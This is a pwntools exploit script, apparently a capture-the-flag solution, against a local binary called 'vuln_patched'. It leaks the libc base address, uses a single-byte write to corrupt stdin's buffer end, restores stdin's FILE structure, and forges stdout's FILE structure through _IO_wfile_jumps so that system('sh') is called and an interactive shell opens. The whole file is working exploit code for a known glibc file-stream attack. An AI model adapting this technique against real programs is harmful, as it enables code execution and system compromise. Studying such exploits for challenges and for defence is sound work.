#!/usr/bin/env python3

from pwn import *

exe = ELF('./vuln_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
brva 0x12E4
brva 0x131D
brva 0x132C
'''

p = process('./vuln_patched')
#p = gdb.debug('./vuln_patched', gdbscript = script)
#debug()
rcu(b"libc.so.6\n")
libc_base = int(b"0x" + p.recv(12), 16) - 0x26000
lleak("libc base", libc_base)

stdin = libc_base + 0x23e8e0
stdout = libc_base + 0x23f5c0

target = stdin + 0x41 # aim for the stdin's buf_end + 0x1
val = ((stdout + 0x300) & 0xffff) >> 8 # calculate offset so can overwrite all stdout
sla(b"Where: ", f"{target}".encode())
sa(b"What: ", p8(val)) # __isoc99_scanf("%c", v4[0]);

# restore stdin (start from [stdin + 132])
x = b"A" * 5
x += p64(libc_base + 0x240720) # _lock
x += p64(0xffffffffffffffff) # _offset
x += p64(0)
x += p64(libc_base + 0x23e9c0) # _IO_wide_data_0
x += p64(0) * 3
x += p32(0xffffffff) # _mode
x += p32(0) + p64(0) * 2
x += p64(libc_base + 0x1dd230) # vtable
payload = x

# padding to reach to stdout
payload = payload.ljust(stdout - (stdin + 131), p8(0))

# overwrite stdout
## fsop (copy straight from note)
_IO_2_1_stdout_ = stdout
system = libc_base + libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload += bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

s(payload) # getchar();

p.interactive()
